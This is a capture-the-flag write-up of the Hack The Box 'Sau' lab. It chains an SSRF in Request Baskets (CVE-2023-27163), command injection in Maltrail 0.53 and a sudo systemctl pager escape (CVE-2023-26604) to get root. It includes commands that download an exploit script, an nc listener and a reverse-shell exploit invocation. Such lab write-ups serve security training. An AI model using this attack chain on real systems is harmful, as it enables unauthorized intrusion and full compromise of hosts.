---
title: "Sau"
difficulty: Easy
os: Linux
points: 20
rating: 4.6
date: 2023-07-08
avatar: assets/htb/sau.png
tags: [OS Command Injection, Server Side Request Forgery (SSRF), Reconnaissance, SUDO Exploitation, Bash, Maltrail, Request Baskets, Web Application]
htb_url: https://app.hackthebox.com/machines/Sau
---

<details>

<summary>About</summary>

### Machine Description

`Sau` is an Easy Difficulty Linux machine that features a `Request Baskets` instance that is vulnerable to Server-Side Request Forgery (SSRF) via `[CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)`. Leveraging the vulnerability we are to gain access to a `Maltrail` instance that is vulnerable to Unauthenticated OS Command Injection, which allows us to gain a reverse shell on the machine as `puma`. A `sudo` misconfiguration is then exploited to gain a `root` shell.

### Area of Interest

Web Application Injections

### Technology

Request Baskets Maltrail

### Vulnerabilities

OS Command Injection Server Side Request Forgery (SSRF)

### Security Tools

Netcat Nmap

### Languages

Bash

### Techniques

Reconnaissance SUDO Exploitation

### CVE

CVE-2023-26604 CVE-2023-27163

</details>

## Summary

Sau is an Easy Linux machine running Ubuntu. The attack chain starts with a Request Baskets 1.2.1 instance on port 55555 that is vulnerable to SSRF (CVE-2023-27163), which I use to reach an internal Maltrail v0.53 service that suffers from unauthenticated OS command injection — giving me a reverse shell as the `puma` user. From there a `sudo` misconfiguration around `systemctl` (CVE-2023-26604) lets me escalate to `root`.

## Enumeration

Before scanning, I set up a working layout and add the target to my hosts file. The last `sed` line is just a reminder to clean the entry out of `/etc/hosts` once I'm done with the box.

🎯 Target IP: `<YOUR_IP>`

```bash
su
echo "<YOUR_IP> sau.htb" >> /etc/hosts

mkdir -p htb/sau.htb
cd htb/sau.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I like to kick off recon with a ping against the target, which confirms connectivity and gives a hint about the OS.

```bash
ping -c 3 sau.htb
PING sau.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from sau.htb (<YOUR_IP>): icmp_seq=1 ttl=63 time=61.0 ms
64 bytes from sau.htb (<YOUR_IP>): icmp_seq=2 ttl=63 time=59.5 ms
64 bytes from sau.htb (<YOUR_IP>): icmp_seq=3 ttl=63 time=60.0 ms
```

From these three ICMP replies the Time To Live (TTL) comes back at \~64 secs, which points to a \*nix host, since Windows boxes typically report a TTL closer to 128 secs.

### Port scanning

A full TCP SYN scan turns up four ports of interest:

```bash
nmap -p0- -sS -Pn -vvv sau.htb -oN nmap/tcp_port_scan
```

```bash
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
```

So I end up with two open TCP ports (22 and 55555) and two filtered TCP ports (80 and 8338). The highest open TCP port is **55555**.

Next, let's fingerprint the services running on the open ports:

```bash
nmap -p22,55555 -sS -Pn -n -v -sCV -T4 sau.htb -oN nmap/service_port_scan
```

```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 09 Nov 2024 14:27:59 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sat, 09 Nov 2024 14:27:33 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sat, 09 Nov 2024 14:27:33 GMT
|_    Content-Length: 0
```

Oddly, port 80 shows up as filtered, yet it appears tied to the service listening on port 55555, so let's dig in.

### Web discovery

Visiting [`http://sau.htb:55555/web`](http://sau.htb:55555/web) reveals a web app that lets you spin up a basket to capture and review HTTP requests. It's the request-baskets app, version 1.2.1 — the software the application is "powered by".

```bash
whatweb sau.htb:55555
http://sau.htb:55555 [302 Found] Country[RESERVED][ZZ], IP[<YOUR_IP>], RedirectLocation[/web]
http://sau.htb:55555/web [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, IP[<YOUR_IP>], JQuery[3.2.1], PasswordField, Script, Title[Request Baskets]
```

```bash
gobuster dir -u http://sau.htb:55555 -w /usr/share/wordlists/dirb/common.txt
```

The only directory it turns up is `/web (Status: 200)`, which unfortunately is just our index page.

## Foothold

### SSRF in Request Baskets (CVE-2023-27163)

A search for 'request-baskets 1.2.1' shows the version is affected by a recent CVE exploitable through an [SSRF](https://portswigger.net/web-security/ssrf) attack — **CVE-2023-27163**.

Once we've gone over the [PoC](https://github.com/entr0pie/CVE-2023-27163/blob/main/README.md) and its usage notes, we can grab CVE-2023-27163.sh and run it to exploit the flaw. I point the forward URL at the internal port 80 that was showing up as filtered:

```bash
wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh
chmod +x CVE-2023-27163.sh
./CVE-2023-27163.sh http://sau.htb:55555 http://sau.htb:80
```

Now I append the generated basket value to my URL and at last reach the filtered port 80: <http://sau.htb:55555/hbvoml>

### OS command injection in Maltrail v0.53

Browsing through the SSRF-proxied service reveals a Maltrail instance. Searching for 'MailTrail v0.53' reveals it's affected by an unauthenticated OS Command Injection (RCE). The `username` parameter on the **login page** (`/login`) fails to sanitize its input, letting an attacker inject OS commands.

The exploit builds a Base64-encoded reverse shell payload to slip past defenses such as a WAF, IPS or IDS, then ships it to the target URL through a curl command. The payload runs on the target, opening a reverse shell back to the attacker's chosen IP and port.

First I start a listener on the attacker machine:

```bash
#first check our IP using ip a
nc -nvlp 4444
```

Then I fire the exploit against the target, pointing it at the SSRF basket URL:

```bash
python3 exploit.py 10.10.14.6 4444 http://sau.htb:55555/hbvoml
```

The listener catches the shell. A quick bit of system enumeration (`whoami` and/or `id`) confirms the Maltrail application is running as the `puma` user. With that, I grab the user flag from puma's home directory:

```bash
cd ~
ll
cat user.txt
8fa7************************c457
```

## Privilege Escalation

### sudo systemctl + pager escape (CVE-2023-26604)

Now I can move on to privilege escalation to grab the root flag. Running `sudo -l` shows the commands that user `puma` is allowed to run with sudo privileges, pointing me at `/usr/bin/systemctl`.

Since `systemctl` is the control utility for the systemd process, I check its version:

```bash
systemctl --version
```

This returns `systemd 245 (245.4-4ubuntu3.22)`. Searching for 'usr/bin/systemctl status trail.service' surfaces **CVE-2023-26604**, a local privilege escalation that abuses systemctl's pager.

Simply by running the allowed command:

```bash
sudo /usr/bin/systemctl status trail.service
```

and typing `!sh` at the pager prompt, I spawn a fresh shell straight away with root privileges. From there I head into the root folder and grab the root flag:

```bash
cat /root/root.txt
c4fc************************aea7
```

---
